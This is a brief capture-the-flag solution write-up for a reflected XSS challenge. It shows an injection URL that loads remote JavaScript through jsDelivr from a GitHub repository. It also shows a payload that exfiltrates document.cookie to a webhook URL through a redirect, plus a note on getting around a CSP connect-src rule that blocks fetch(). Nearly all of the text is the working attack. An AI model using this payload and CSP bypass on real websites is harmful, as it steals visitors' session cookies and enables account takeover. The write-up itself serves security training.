## Solution

Using jsdelivr to host custom github repo that executes javascripts

```
http://challenge_url:5252/search?q=%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/j3seer/test@main/XSS.js%22
``` 

payload in xss.js

```javascript

document.location="http://webhook_url/?c="+document.cookie

```

Note that ``fetch()`` won't work because of connect-src in the CSP, it disables any sort of requests cross domain and since document.location is just a redirection, it works!
